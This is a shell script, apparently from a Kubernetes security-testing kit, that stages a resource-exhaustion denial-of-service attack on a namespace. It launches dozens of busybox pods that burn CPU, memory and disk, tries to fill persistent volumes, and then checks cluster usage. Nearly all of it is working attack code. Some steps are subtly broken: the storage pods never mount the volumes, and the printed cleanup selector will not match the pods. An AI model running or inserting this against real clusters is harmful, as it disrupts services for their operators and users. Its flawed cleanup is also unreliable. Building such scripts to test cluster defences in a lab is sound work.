#!/bin/sh
set -eu

# Attempts to exhaust cluster resources (CPU, memory, storage)
# This simulates a DoS attack on the cluster

namespace="${1:-frontend}"
replicas="${2:-50}"

echo "[ATTACK] Resource Exhaustion Attack"
echo "[INFO] Target namespace: $namespace"
echo "[INFO] Attempting to create $replicas pods"

# Step 1: Create many pods to exhaust resources
echo "[ATTACK] Creating resource-intensive pods..."
for i in $(seq 1 "$replicas"); do
    kubectl run resource-exhaust-$(date +%s)-$i \
        --image=busybox \
        --namespace="$namespace" \
        --restart=Always \
        --requests=cpu=1000m,memory=1Gi \
        --limits=cpu=2000m,memory=2Gi \
        -- sh -c "while true; do dd if=/dev/zero of=/tmp/test bs=1M count=100; sleep 1; done" 2>/dev/null &
done

# Step 2: Create pods with high CPU usage
echo "[ATTACK] Creating CPU-intensive pods..."
for i in $(seq 1 10); do
    kubectl run cpu-exhaust-$(date +%s)-$i \
        --image=busybox \
        --namespace="$namespace" \
        --restart=Always \
        -- sh -c "while true; do :; done" 2>/dev/null &
done

# Step 3: Create pods with high memory usage
echo "[ATTACK] Creating memory-intensive pods..."
for i in $(seq 1 10); do
    kubectl run mem-exhaust-$(date +%s)-$i \
        --image=busybox \
        --namespace="$namespace" \
        --restart=Always \
        -- sh -c "while true; do tail -f /dev/zero; done" 2>/dev/null &
done

# Step 4: Try to fill storage
echo "[ATTACK] Attempting to fill persistent volumes..."
kubectl get pvc -n "$namespace" -o name 2>/dev/null | while read pvc; do
    if [ -n "$pvc" ]; then
        pod_name="storage-fill-$(date +%s)"
        kubectl run "$pod_name" \
            --image=busybox \
            --namespace="$namespace" \
            --restart=Never \
            --rm -i -- \
            -- sh -c "dd if=/dev/zero of=/mnt/test bs=1M count=10000" 2>/dev/null &
    fi
done

# Step 5: Monitor resource usage
echo "[ATTACK] Checking cluster resource usage..."
sleep 5
kubectl top nodes 2>/dev/null || echo "[INFO] Metrics not available"
kubectl top pods -n "$namespace" 2>/dev/null | head -20 || echo "[INFO] Pod metrics not available"

echo "[COMPLETE] Resource exhaustion attack initiated"
echo "[INFO] Clean up with: kubectl delete pods -n $namespace -l run=resource-exhaust-*"

